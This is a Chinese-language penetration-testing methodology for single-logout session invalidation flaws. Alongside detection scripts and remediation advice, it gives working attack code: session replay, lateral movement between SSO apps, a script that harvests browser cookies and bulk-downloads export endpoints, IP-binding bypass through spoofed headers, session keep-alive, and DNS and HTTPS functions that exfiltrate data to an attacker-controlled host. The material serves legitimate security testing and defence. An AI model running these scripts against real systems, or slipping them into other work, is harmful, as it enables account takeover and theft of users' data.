# SSO/SLO 会话失效攻击方法论

---

# 第一部分：文档概述

## 1.1 编写目的

本文档旨在为渗透测试人员提供一套标准化的 SSO（单点登录）/SLO（单点注销）会话失效漏洞检测和利用流程。SSO 系统允许用户使用一组凭证登录多个相关但独立的软件系统，但 SLO 实现不当会导致用户在一个系统注销后，其他系统的会话仍然有效，造成严重的安全风险。

## 1.2 适用范围

本文档适用于所有使用 SSO/SAML/OIDC/OAuth 联邦认证的系统，包括：
- 企业 SSO 系统（Okta、Azure AD、Ping Identity 等）
- SaaS 多租户应用
- 微服务架构的认证系统
- 使用第三方登录的应用（Google、Facebook、微信登录等）

## 1.3 读者对象

本文件主要面向执行渗透测试任务的安全工程师、安全分析师，以及负责 SSO 系统设计和开发的安全开发人员。

---

# 第二部分：核心渗透技术专题

## 2.1 技术介绍

### 漏洞原理

**SSO（Single Sign-On，单点登录）**：用户只需登录一次即可访问多个相互信任的应用系统。

**SLO（Single Logout，单点注销）**：用户在一个系统注销时，所有关联系统的会话都应同时失效。

**SLO 会话失效漏洞**：当 SLO 实现不当时，用户在一个应用注销后，其他应用的会话仍然有效，攻击者可以利用这些未失效的会话进行未授权访问。

**本质问题**：
- 会话状态未集中管理
- 注销时未通知所有依赖方（Relying Parties）
- 令牌未正确撤销
- 会话超时配置不一致
- 前端会话与后端会话不同步

### 常见 CWE 映射

| CWE 编号 | 描述 |
|---------|------|
| CWE-613 | 会话过期不足 (Insufficient Session Expiration) |
| CWE-614 | Cookie 中的敏感信息 (Sensitive Cookie in HTTPS Session Without 'Secure' Attribute) |
| CWE-287 | 不当认证 (Improper Authentication) |
| CWE-306 | 关键功能缺少认证 (Missing Authentication for Critical Function) |

### SSO/SLO 架构示意图

```
                    ┌─────────────────┐
                    │   Identity      │
                    │   Provider      │
                    │   (IdP)         │
                    └────────┬────────┘
                             │
           ┌─────────────────┼─────────────────┐
           │                 │                 │
           ▼                 ▼                 ▼
    ┌─────────────┐  ┌─────────────┐  ┌─────────────┐
    │  App A      │  │  App B      │  │  App C      │
    │  (Email)    │  │  (Docs)     │  │  (Chat)     │
    └─────────────┘  └─────────────┘  └─────────────┘
           │                 │                 │
           └─────────────────┴─────────────────┘
                             │
                    ┌────────▼────────┐
                    │   User Session  │
                    │   (Shared)      │
                    └─────────────────┘

问题场景：
- 用户在 App A 点击注销
- IdP 收到注销请求
- 但 App B 和 App C 的会话未失效
- 攻击者可使用 App B/C 的会话继续访问
```

## 2.2 攻击常见于哪些业务场景

| 业务场景 | 功能示例 | 风险点描述 |
|---------|---------|-----------|
| 企业办公套件 | 邮件、文档、日历、聊天 | 注销邮件后文档/聊天仍可访问 |
| SaaS 平台 | 多模块 SaaS 应用 | 模块间会话不同步 |
| 微服务架构 | 多个微服务共享认证 | 令牌未统一撤销 |
| 第三方登录 | Google/Facebook 登录 | 第三方会话未失效 |
| 移动 + Web | 同一账户多端登录 | 移动端会话未失效 |
| API 网关 | 多个后端服务 | API Token 未撤销 |

### 典型攻击场景

**场景 1：公共计算机会话残留**

```
1. 用户在公共计算机登录企业 SSO
2. 访问邮件系统、文档系统、聊天系统
3. 用户仅在邮件系统点击注销
4. 用户离开计算机（未关闭浏览器）
5. 攻击者使用同一浏览器访问文档系统
6. 文档系统会话仍然有效 → 数据泄露
```

**场景 2：多应用会话劫持**

```
1. 用户登录 SSO，访问多个应用
2. 攻击者通过 XSS 窃取会话 Token
3. 用户在其中一个应用注销
4. 攻击者使用窃取的 Token 访问其他应用
5. 其他应用会话未失效 → 未授权访问
```

**场景 3：移动设备会话持久化**

```
1. 用户在手机 App 登录
2. 在 Web 端修改密码并注销所有会话
3. 手机 App 会话仍然有效（未收到注销通知）
4. 攻击者获取手机访问权 → 账户沦陷
```

## 2.3 漏洞发现方法

### 2.3.1 SSO 架构识别

```bash
# 1. 识别 IdP
# 检查登录页面是否重定向到第三方认证

# 2. 识别 SSO 协议
# SAML: 查找 /saml、/metadata、/assertion 端点
# OIDC: 查找 /.well-known/openid-configuration
# OAuth: 查找 /oauth、/authorize、/token 端点

# 3. 识别关联应用
# 查看 SSO 成功后的重定向目标
# 检查是否有多个子域名/应用共享认证
```

**SSO 协议检测脚本**：

```python
#!/usr/bin/env python3
"""
SSO 协议检测脚本
识别目标系统使用的 SSO 协议和关联应用
"""

import requests
from urllib.parse import urlparse, urljoin

class SSODetector:
    def __init__(self, base_url):
        self.base_url = base_url
        self.session = requests.Session()
        self.sso_info = {
            'protocol': None,
            'idp': None,
            'applications': [],
            'logout_endpoints': []
        }
    
    def detect_sso_protocol(self):
        """检测 SSO 协议"""
        print("[*] Detecting SSO protocol...")
        
        # 检查 SAML
        saml_endpoints = ['/saml/metadata', '/saml2/metadata', '/FederationMetadata/2007-06/FederationMetadata.xml']
        for endpoint in saml_endpoints:
            try:
                response = self.session.get(urljoin(self.base_url, endpoint))
                if response.status_code == 200 and 'EntityDescriptor' in response.text:
                    self.sso_info['protocol'] = 'SAML'
                    print(f"[+] SAML detected at {endpoint}")
                    return
            except:
                pass
        
        # 检查 OIDC
        try:
            response = self.session.get(urljoin(self.base_url, '/.well-known/openid-configuration'))
            if response.status_code == 200:
                self.sso_info['protocol'] = 'OIDC'
                print("[+] OIDC detected")
                config = response.json()
                if 'issuer' in config:
                    self.sso_info['idp'] = config['issuer']
                return
        except:
            pass
        
        # 检查 OAuth
        oauth_indicators = ['/oauth/authorize', '/oauth/token', '/connect/authorize']
        for endpoint in oauth_indicators:
            try:
                response = self.session.get(urljoin(self.base_url, endpoint))
                if response.status_code in [200, 302, 400]:
                    self.sso_info['protocol'] = 'OAuth'
                    print(f"[+] OAuth detected at {endpoint}")
                    return
            except:
                pass
        
        print("[-] No SSO protocol detected")
    
    def discover_applications(self):
        """发现关联应用"""
        print("[*] Discovering linked applications...")
        
        # 常见关联应用路径
        app_paths = [
            '/mail', '/email', '/inbox',
            '/docs', '/drive', '/files',
            '/chat', '/meet', '/calendar',
            '/crm', '/erp', '/hr',
            '/admin', '/dashboard', '/portal'
        ]
        
        for path in app_paths:
            try:
                response = self.session.get(urljoin(self.base_url, path))
                if response.status_code == 200:
                    # 检查是否有认证标识
                    if 'logged in' in response.text.lower() or \
                       'welcome' in response.text.lower() or \
                       'dashboard' in response.text.lower():
                        self.sso_info['applications'].append(path)
                        print(f"[+] Found application: {path}")
            except:
                pass
    
    def find_logout_endpoints(self):
        """查找注销端点"""
        print("[*] Finding logout endpoints...")
        
        logout_paths = [
            '/logout', '/signout', '/sign-out', '/logoff',
            '/saml/logout', '/oauth/logout', '/oidc/logout',
            '/auth/logout', '/session/logout'
        ]
        
        for path in logout_paths:
            try:
                response = self.session.head(urljoin(self.base_url, path))
                if response.status_code in [200, 302, 303]:
                    self.sso_info['logout_endpoints'].append(path)
                    print(f"[+] Found logout endpoint: {path}")
            except:
                pass
    
    def generate_report(self):
        """生成 SSO 架构报告"""
        print("\n" + "="*50)
        print("SSO Architecture Report")
        print("="*50)
        print(f"Protocol: {self.sso_info['protocol'] or 'Not detected'}")
        print(f"IdP: {self.sso_info['idp'] or 'Not detected'}")
        print(f"Applications: {', '.join(self.sso_info['applications']) or 'None found'}")
        print(f"Logout Endpoints: {', '.join(self.sso_info['logout_endpoints']) or 'None found'}")
        return self.sso_info

if __name__ == '__main__':
    import sys
    if len(sys.argv) > 1:
        detector = SSODetector(sys.argv[1])
        detector.detect_sso_protocol()
        detector.discover_applications()
        detector.find_logout_endpoints()
        detector.generate_report()
    else:
        print("Usage: python sso_detector.py <base_url>")
```

### 2.3.2 SLO 失效检测

**手动检测方法**：

```bash
# 步骤 1：登录 SSO 并访问多个应用
# 1. 登录 https://sso.example.com
# 2. 访问 https://app-a.example.com
# 3. 访问 https://app-b.example.com
# 4. 访问 https://app-c.example.com

# 步骤 2：记录所有会话 Cookie
# 保存每个应用的 Cookie 到不同文件

# 步骤 3：在一个应用注销
curl -X POST https://app-a.example.com/logout

# 步骤 4：使用其他应用的 Cookie 测试会话
curl -b app-b-cookies.txt https://app-b.example.com/dashboard
curl -b app-c-cookies.txt https://app-c.example.com/dashboard

# 如果仍能访问，SLO 未正确实现
```

**自动化 SLO 检测脚本**：

```python
#!/usr/bin/env python3
"""
SLO 会话失效检测脚本
检测单点注销后其他应用会话是否失效
"""

import requests
import json

class SLOTester:
    def __init__(self, base_url, credentials):
        self.base_url = base_url
        self.credentials = credentials
        self.sessions = {}
        self.applications = []
    
    def login_and_collect_sessions(self):
        """登录并收集所有应用会话"""
        print("[*] Logging in and collecting sessions...")
        
        # 主登录
        main_session = requests.Session()
        response = main_session.post(f"{self.base_url}/login", data=self.credentials)
        
        if response.status_code not in [200, 302]:
            print("[-] Login failed")
            return False
        
        self.sessions['main'] = main_session
        print("[+] Main session established")
        
        # 访问各个应用并保存会话
        self.applications = ['/app-a', '/app-b', '/app-c']
        
        for app in self.applications:
            app_session = requests.Session()
            # 复制主会话的 Cookie
            app_session.cookies.update(main_session.cookies)
            
            try:
                response = app_session.get(f"{self.base_url}{app}")
                if response.status_code == 200:
                    self.sessions[app] = app_session
                    print(f"[+] Session established for {app}")
                else:
                    print(f"[-] Failed to access {app}")
            except Exception as e:
                print(f"[-] Error accessing {app}: {e}")
        
        return True
    
    def test_slo(self, logout_app):
        """测试 SLO - 在指定应用注销后测试其他应用"""
        print(f"\n[*] Testing SLO - logging out from {logout_app}")
        
        # 在指定应用注销
        if logout_app in self.sessions:
            try:
                response = self.sessions[logout_app].post(f"{self.base_url}{logout_app}/logout")
                print(f"[*] Logout request sent to {logout_app}")
            except Exception as e:
                print(f"[-] Logout failed: {e}")
                return
        
        # 测试其他应用会话是否失效
        print("[*] Testing other application sessions...")
        slo_failures = []
        
        for app, session in self.sessions.items():
            if app == logout_app or app == 'main':
                continue
            
            try:
                response = session.get(f"{self.base_url}{app}/dashboard")
                
                if response.status_code == 200:
                    # 检查是否真的登录状态
                    if 'logged in' in response.text.lower() or \
                       'welcome' in response.text.lower() or \
                       'dashboard' in response.text.lower():
                        print(f"[VULNERABLE] {app} session still valid after logout from {logout_app}")
                        slo_failures.append(app)
                    else:
                        print(f"[SAFE] {app} session invalidated")
                else:
                    print(f"[SAFE] {app} returned {response.status_code}")
            
            except Exception as e:
                print(f"[-] Error testing {app}: {e}")
        
        return slo_failures
    
    def generate_report(self, failures):
        """生成 SLO 测试报告"""
        print("\n" + "="*50)
        print("SLO Test Report")
        print("="*50)
        
        if not failures:
            print("[PASS] All sessions properly invalidated")
        else:
            print(f"[FAIL] {len(failures)} application(s) with session persistence:")
            for app in failures:
                print(f"  - {app}")
            print("\n[VULNERABLE] SLO not properly implemented!")

if __name__ == '__main__':
    # 示例用法
    tester = SLOTester(
        'https://sso.example.com',
        {'username': 'test', 'password': 'test123'}
    )
    
    if tester.login_and_collect_sessions():
        # 测试从 app-a 注销后其他应用会话
        failures = tester.test_slo('/app-a')
        tester.generate_report(failures)
```

### 2.3.3 会话超时检测

```bash
# 测试会话超时配置
# 1. 登录获取会话
curl -c cookies.txt -X POST https://target.com/login -d "username=test&password=test"

# 2. 立即测试会话
curl -b cookies.txt https://target.com/dashboard
echo "Immediate: $?"

# 3. 等待不同时间后测试
sleep 300  # 5 分钟
curl -b cookies.txt https://target.com/dashboard
echo "After 5 min: $?"

sleep 3600  # 1 小时
curl -b cookies.txt https://target.com/dashboard
echo "After 1 hour: $?"

sleep 86400  # 24 小时
curl -b cookies.txt https://target.com/dashboard
echo "After 24 hours: $?"
```

## 2.4 漏洞利用方法

### 2.4.1 基础会话重放攻击

```python
#!/usr/bin/env python3
"""
SLO 会话重放攻击
利用注销后会话未失效的漏洞
"""

import requests
import pickle
import json

class SLOSessionReplay:
    def __init__(self, target_base):
        self.target_base = target_base
    
    def capture_session(self, session, app_name):
        """捕获并保存会话"""
        session_data = {
            'cookies': dict(session.cookies),
            'headers': dict(session.headers)
        }
        
        with open(f'session_{app_name}.json', 'w') as f:
            json.dump(session_data, f)
        
        print(f"[+] Session captured for {app_name}")
    
    def load_session(self, app_name):
        """加载保存的会话"""
        try:
            with open(f'session_{app_name}.json', 'r') as f:
                session_data = json.load(f)
            
            session = requests.Session()
            session.cookies.update(session_data['cookies'])
            session.headers.update(session_data['headers'])
            
            return session
        except Exception as e:
            print(f"[-] Failed to load session: {e}")
            return None
    
    def replay_session(self, session, app_path):
        """重放会话访问应用"""
        try:
            response = session.get(f"{self.target_base}{app_path}")
            
            if response.status_code == 200:
                print(f"[SUCCESS] Session replay successful for {app_path}")
                print(f"    Response length: {len(response.text)} bytes")
                
                # 收集敏感数据
                self.collect_sensitive_data(response)
                
                return True
            else:
                print(f"[-] Session replay failed: {response.status_code}")
                return False
        except Exception as e:
            print(f"[-] Error replaying session: {e}")
            return False
    
    def collect_sensitive_data(self, response):
        """从响应中收集敏感数据"""
        # 查找敏感数据模式
        sensitive_patterns = [
            'email', 'password', 'token', 'api_key',
            'credit_card', 'ssn', 'phone', 'address'
        ]
        
        for pattern in sensitive_patterns:
            if pattern in response.text.lower():
                print(f"[!] Found sensitive data pattern: {pattern}")
    
    def attack_workflow(self):
        """完整攻击流程"""
        print("[*] SLO Session Replay Attack Workflow")
        print("="*50)
        
        # 步骤 1：假设已捕获会话（实际攻击中通过 XSS、MITM 等获取）
        print("[*] Step 1: Load captured sessions")
        
        # 步骤 2：用户在主应用注销（攻击者等待）
        print("[*] Step 2: Wait for user to logout from main app")
        
        # 步骤 3：重放其他应用会话
        print("[*] Step 3: Replay sessions from other apps")
        
        apps = ['app-a', 'app-b', 'app-c']
        for app in apps:
            session = self.load_session(app)
            if session:
                self.replay_session(session, f'/{app}/dashboard')

if __name__ == '__main__':
    attacker = SLOSessionReplay('https://target.com')
    attacker.attack_workflow()
```

### 2.4.2 多应用横向移动

```python
#!/usr/bin/env python3
"""
SSO 会话横向移动
利用 SSO 信任关系在应用间移动
"""

import requests

class SSOLateralMovement:
    def __init__(self, idp_url, applications):
        self.idp_url = idp_url
        self.applications = applications  # 应用列表
        self.sessions = {}
    
    def establish_initial_session(self, app_name, credentials):
        """建立初始会话"""
        session = requests.Session()
        
        # 通过 IdP 登录
        response = session.post(f"{self.idp_url}/login", data=credentials)
        
        if response.status_code in [200, 302]:
            self.sessions[app_name] = session
            print(f"[+] Initial session established via {app_name}")
            return True
        return False
    
    def lateral_move(self, source_app, target_app):
        """从一个应用横向移动到另一个应用"""
        if source_app not in self.sessions:
            print(f"[-] Source session {source_app} not available")
            return False
        
        source_session = self.sessions[source_app]
        
        # 使用源会话的 Cookie 访问目标应用
        target_session = requests.Session()
        target_session.cookies.update(source_session.cookies)
        
        try:
            response = target_session.get(f"{self.applications[target_app]}")
            
            if response.status_code == 200:
                self.sessions[target_app] = target_session
                print(f"[+] Lateral movement successful: {source_app} -> {target_app}")
                return True
            else:
                print(f"[-] Lateral movement failed: {response.status_code}")
                return False
        except Exception as e:
            print(f"[-] Error during lateral movement: {e}")
            return False
    
    def enumerate_accessible_resources(self, app_name):
        """枚举可访问的资源"""
        if app_name not in self.sessions:
            return []
        
        session = self.sessions[app_name]
        resources = []
        
        # 常见资源端点
        endpoints = [
            '/api/users',
            '/api/documents',
            '/api/files',
            '/api/messages',
            '/admin/users',
            '/admin/settings',
            '/export/data'
        ]
        
        for endpoint in endpoints:
            try:
                response = session.get(f"{self.applications[app_name]}{endpoint}")
                if response.status_code == 200:
                    resources.append(endpoint)
                    print(f"[+] Accessible: {endpoint}")
            except:
                pass
        
        return resources

# 使用示例
if __name__ == '__main__':
    apps = {
        'email': 'https://email.target.com',
        'docs': 'https://docs.target.com',
        'chat': 'https://chat.target.com'
    }
    
    attacker = SSOLateralMovement('https://sso.target.com', apps)
    
    # 通过邮件应用建立初始会话
    attacker.establish_initial_session('email', {
        'username': 'victim',
        'password': 'password123'
    })
    
    # 横向移动到文档应用
    attacker.lateral_move('email', 'docs')
    
    # 枚举可访问资源
    attacker.enumerate_accessible_resources('docs')
```

### 2.4.3 公共计算机会话窃取

**攻击场景**：

```
1. 用户在公共计算机登录 SSO
2. 访问多个应用（邮件、文档、聊天）
3. 用户仅在邮件应用点击注销
4. 用户离开（未清除浏览器数据）
5. 攻击者访问同一浏览器

攻击步骤：
1. 检查浏览器历史记录找到访问过的应用
2. 直接访问文档/聊天应用
3. 会话仍然有效 → 未授权访问
4. 导出敏感数据
5. 清除攻击痕迹
```

**利用脚本**：

```python
#!/usr/bin/env python3
"""
公共计算机会话窃取脚本
模拟攻击者利用用户未完全注销的场景
"""

import requests
import browser_cookie3  # 需要安装：pip install browser_cookie3

class PublicComputerSessionStealer:
    def __init__(self, target_domains):
        self.target_domains = target_domains
        self.stolen_sessions = {}
    
    def steal_browser_sessions(self, browser='chrome'):
        """从浏览器窃取会话 Cookie"""
        print(f"[*] Stealing sessions from {browser}...")
        
        try:
            for domain in self.target_domains:
                cookies = browser_cookie3.load(domain_name=domain, browser_name=browser)
                
                if cookies:
                    session = requests.Session()
                    for cookie in cookies:
                        session.cookies.set(cookie.name, cookie.value, domain=cookie.domain)
                    
                    self.stolen_sessions[domain] = session
                    print(f"[+] Stolen session for {domain}")
        except Exception as e:
            print(f"[-] Failed to steal sessions: {e}")
    
    def test_session_validity(self):
        """测试窃取的会话是否有效"""
        print("[*] Testing session validity...")
        
        valid_sessions = []
        
        for domain, session in self.stolen_sessions.items():
            try:
                response = session.get(f"{domain}/dashboard")
                
                if response.status_code == 200:
                    # 检查是否真的登录
                    if any(keyword in response.text.lower() 
                           for keyword in ['welcome', 'logged in', 'dashboard', 'profile']):
                        print(f"[VALID] Session valid for {domain}")
                        valid_sessions.append(domain)
                    else:
                        print(f"[INVALID] Session invalid for {domain}")
                else:
                    print(f"[INVALID] {domain} returned {response.status_code}")
            except Exception as e:
                print(f"[-] Error testing {domain}: {e}")
        
        return valid_sessions
    
    def exfiltrate_data(self, domain):
        """从有效会话导出数据"""
        if domain not in self.stolen_sessions:
            return
        
        session = self.stolen_sessions[domain]
        
        # 导出常见敏感数据
        export_endpoints = [
            '/export/contacts',
            '/export/documents',
            '/export/messages',
            '/api/users/list',
            '/api/data/export'
        ]
        
        for endpoint in export_endpoints:
            try:
                response = session.get(f"{domain}{endpoint}")
                if response.status_code == 200:
                    filename = f"{domain.replace('https://', '').replace('/', '_')}{endpoint.replace('/', '_')}.txt"
                    with open(filename, 'wb') as f:
                        f.write(response.content)
                    print(f"[+] Exported: {filename}")
            except:
                pass

if __name__ == '__main__':
    # 示例用法（仅用于授权测试）
    domains = [
        'https://mail.company.com',
        'https://docs.company.com',
        'https://chat.company.com'
    ]
    
    attacker = PublicComputerSessionStealer(domains)
    attacker.steal_browser_sessions()
    valid = attacker.test_session_validity()
    
    for domain in valid:
        attacker.exfiltrate_data(domain)
```

## 2.5 漏洞利用绕过方法

### 2.5.1 绕过会话绑定检测

```python
# 如果会话与 IP 绑定，尝试以下方法

# 1. 使用相同的出口 IP（如果可能）
# 2. 尝试 X-Forwarded-For 头欺骗
headers = {
    'X-Forwarded-For': 'original_user_ip',
    'X-Real-IP': 'original_user_ip'
}

# 3. 某些应用仅检查部分绑定条件
# 尝试修改 User-Agent 匹配原会话
headers['User-Agent'] = 'original_user_agent'
```

### 2.5.2 绕过会话超时

```python
# 对于有超时会话，定期发送心跳保持活跃

import time
import threading

def keep_session_alive(session, url, interval=300):
    """定期发送请求保持会话活跃"""
    while True:
        try:
            session.get(url)
            print(f"[+] Session kept alive at {time.strftime('%H:%M:%S')}")
        except:
            print("[-] Session expired")
            break
        time.sleep(interval)

# 在后台线程中运行
thread = threading.Thread(target=keep_session_alive, args=(session, url, 300))
thread.daemon = True
thread.start()
```

### 2.5.3 隐蔽数据外带

```python
# 使用隐蔽方式外带数据

# 1. DNS 外带（需要 DNS 日志服务器）
import dns.resolver

def dns_exfil(data, dns_server):
    """通过 DNS 查询外带数据"""
    import base64
    encoded = base64.b32encode(data.encode()).decode().lower().rstrip('=')
    
    # 分片发送
    chunk_size = 30
    for i in range(0, len(encoded), chunk_size):
        chunk = encoded[i:i+chunk_size]
        try:
            dns.resolver.resolve(f"{chunk}.{dns_server}", 'A')
        except:
            pass

# 2. HTTPS 外带到攻击者服务器
def https_exfil(data, exfil_url):
    """通过 HTTPS 外带数据"""
    requests.post(exfil_url, data=data)
```

---

# 第三部分：附录

## 3.1 SSO/SLO 测试检查清单

| 检查项 | 测试方法 | 预期结果 |
|-------|---------|---------|
| SSO 协议识别 | 检查端点和响应 | 应明确协议类型 |
| 关联应用发现 | 访问各应用 | 应共享认证状态 |
| SLO 功能测试 | 在一个应用注销 | 所有应用会话应失效 |
| 会话超时 | 等待不同时间 | 应在合理时间后过期 |
| 令牌撤销 | 注销后测试令牌 | 令牌应被撤销 |
| 跨域会话 | 测试子域名会话 | 应正确隔离或共享 |
| 移动端会话 | Web 注销后测试 App | 移动端会话应失效 |

## 3.2 SLO 实现最佳实践

### 服务端实现

```
1. 集中式会话管理
   - 使用 Redis 等集中存储会话状态
   - 所有应用共享同一会话存储

2. 注销广播机制
   - 注销时向所有应用发送失效通知
   - 使用消息队列（RabbitMQ、Kafka）广播

3. 令牌黑名单
   - 注销时将会话 Token 加入黑名单
   - 所有应用检查黑名单

4. 短有效期令牌
   - 使用短有效期 Access Token
   - 配合 Refresh Token 机制
```

### 客户端实现

```
1. 完全清除本地数据
   - 清除所有 Cookie
   - 清除 LocalStorage/SessionStorage
   - 清除 Service Worker 缓存

2. 关闭所有标签页
   - 提示用户关闭所有相关标签页
   - 或自动关闭（需要浏览器扩展）

3. 会话状态同步
   - 使用 BroadcastChannel API 同步注销状态
   - 多标签页同时注销
```

## 3.3 修复建议

### 立即修复

1. **实现集中式 SLO** - 注销时通知所有依赖方
2. **缩短会话有效期** - 减少会话重用窗口
3. **实施令牌撤销** - 注销时立即撤销令牌

### 中期修复

1. **会话活动监控** - 检测异常会话使用
2. **设备管理** - 允许用户查看和管理已登录设备
3. **强制注销** - 提供"注销所有设备"功能

### 长期修复

1. **零信任架构** - 持续验证，永不信任
2. **自适应会话** - 基于风险动态调整会话策略
3. **无状态认证** - 使用短有效期 JWT 减少会话状态

## 3.4 参考资源

- [OWASP SAML Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SAML_Security_Cheat_Sheet.html)
- [OWASP Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)
- [NIST SP 800-63C Federation and Assurance Guidelines](https://pages.nist.gov/800-63-3/sp800-63c.html)
- [Okta SLO Best Practices](https://developer.okta.com/docs/concepts/session/)
